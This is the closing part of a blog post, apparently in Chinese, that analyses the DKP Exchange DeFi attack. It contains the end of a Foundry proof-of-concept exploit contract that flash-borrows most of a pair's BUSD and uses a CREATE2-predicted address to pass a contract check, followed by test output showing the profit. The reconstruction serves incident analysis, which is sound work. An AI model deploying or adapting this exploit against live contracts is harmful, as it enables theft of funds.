+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">b</span> <span class="o">=</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Pair</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;BUSD balance of Pair&#34;</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span> <span class="mi">9992</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10000</span><span class="p">;</span> <span class="c1">// 99.92 %
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;I will borrow out&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">calculteSpecialContractAddress</span><span class="p">()</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">predictedAddress</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint160</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">keccak256</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                            <span class="kt">bytes1</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">the_salt</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="nb">keccak256</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                    <span class="nb">type</span><span class="p">(</span><span class="nc">RunAsNotContract</span><span class="p">).</span><span class="nb">creationCode</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">predictedAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">DKP2BUSD</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DKP</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Router</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">DKP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">BUSD</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Router</span><span class="p">.</span><span class="n">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">DKP</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DKP</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Router</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[PASS] testHack() (gas: 520036)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  BUSD balance at the beginning: 1000.000000000000000000
+</span></span><span class="line"><span class="cl">  BUSD balance of Pair: 259605.445236391899433885
+</span></span><span class="line"><span class="cl">  I will borrow out: 259397.760880202785914337
+</span></span><span class="line"><span class="cl">  DKP balance: 17666.042408805118459861
+</span></span><span class="line"><span class="cl">  BUSD balance at the end: 81512.615981085813934882
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/dpk-exchange-attack/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析" data-hashtags="defi"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-hashtag="defi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defi/">defi</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/euler-finance-attack/" class="prev" rel="prev" title="Euler Finance 黑客攻击分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Euler Finance 黑客攻击分析</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":2000},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
